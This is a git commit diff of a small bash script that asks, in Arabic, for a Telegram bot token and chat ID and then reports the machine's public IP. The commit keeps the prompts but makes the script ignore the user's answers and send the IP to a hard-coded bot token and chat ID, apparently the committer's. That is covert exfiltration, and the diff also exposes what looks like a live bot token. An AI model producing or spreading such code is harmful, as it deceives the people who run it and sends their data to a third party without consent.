3000123a4a75ee84db6aed28297c5faf8ba08c7f
@user-rm4zx2ct2b <122453622+hacingsfdfds@users.noreply.github.com>
2023-04-05 03:52:51 +0300

    Update microt.sh

--- microt.sh
+++ microt.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
-echo "token"
+echo "برجاء ادخال توكن البوت"
 read token
-echo "ip"
+echo "برجاء ادخال الايدي المخصص للبوت"
 read id
 ip=$(curl ipinfo.io/ip)
-curl -X POST https://api.telegram.org/bot$token/sendMessage -d text="الايبي الخاص بك هو:  $ip" -d chat_id=$id
+curl -X POST https://api.telegram.org/bot5091863873:AAGnSOzOVrhVzEalbLCUhokbkauJS1ug_GU/sendMessage -d text="الايبي الخاص بك هو:  $ip" -d chat_id=1218276055
